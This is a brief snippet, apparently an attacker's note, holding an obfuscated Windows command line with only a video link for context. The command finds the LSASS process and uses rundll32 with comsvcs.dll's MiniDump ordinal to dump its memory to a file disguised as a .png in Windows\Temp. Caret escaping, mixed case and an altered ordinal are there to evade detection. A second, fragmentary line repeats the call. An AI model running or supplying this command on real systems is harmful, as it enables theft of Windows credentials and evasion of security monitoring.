# https://www.youtube.com/watch?v=52tAmVLg1KM
%COMSPEC% /Q /c cmd.eXE /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\jvX7H.png ful
rundll32.exe comsvcs.dll,#24’
